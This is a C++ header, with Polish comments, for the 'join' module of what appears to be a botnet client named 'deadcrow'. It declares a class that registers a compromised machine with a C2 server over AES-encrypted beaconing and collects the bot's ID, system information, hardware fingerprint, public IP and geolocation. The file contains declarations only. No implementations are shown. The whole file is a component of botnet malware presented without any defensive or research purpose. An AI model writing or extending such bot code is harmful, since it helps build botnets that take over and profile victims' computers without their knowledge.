#pragma once

#include <string>
#include <vector>
#include <functional>
#include "../core/beacon.h"
#include "bot_id.h"

namespace deadcrow {
namespace botnet {

class Join {
public:
    // Konstruktor
    Join(const std::string& c2_url, const std::string& aes_key);
    
    // Dołączanie do botnetu
    bool joinBotnet();
    
    // Ustawienie callbacka do raportowania statusu
    void setStatusCallback(std::function<void(const std::string&)> callback);
    
    // Ustawienie obiektu beacon do komunikacji
    void setBeacon(std::shared_ptr<core::Beacon> beacon);
    
    // Pobieranie ID bota
    std::string getBotId() const;
    
    // Pobieranie informacji o systemie
    std::string getSystemInfo() const;
    
    // Pobieranie fingerprinta sprzętu
    std::string getHardwareFingerprint() const;
    
    // Pobieranie geolokalizacji
    std::string getGeoLocation();
    
private:
    // URL serwera C2
    std::string c2_url_;
    
    // Klucz AES do szyfrowania komunikacji
    std::string aes_key_;
    
    // Obiekt BotId
    BotId bot_id_;
    
    // Obiekt Beacon do komunikacji
    std::shared_ptr<core::Beacon> beacon_;
    
    // Callback do raportowania statusu
    std::function<void(const std::string&)> status_callback_;
    
    // Geolokalizacja
    std::string geo_location_;
    
    // Raportowanie statusu
    void reportStatus(const std::string& status);
    
    // Pobieranie adresu IP
    std::string getPublicIp();
    
    // Pobieranie geolokalizacji na podstawie IP
    bool fetchGeoLocation(const std::string& ip);
};

} // namespace botnet
} // namespace deadcrow
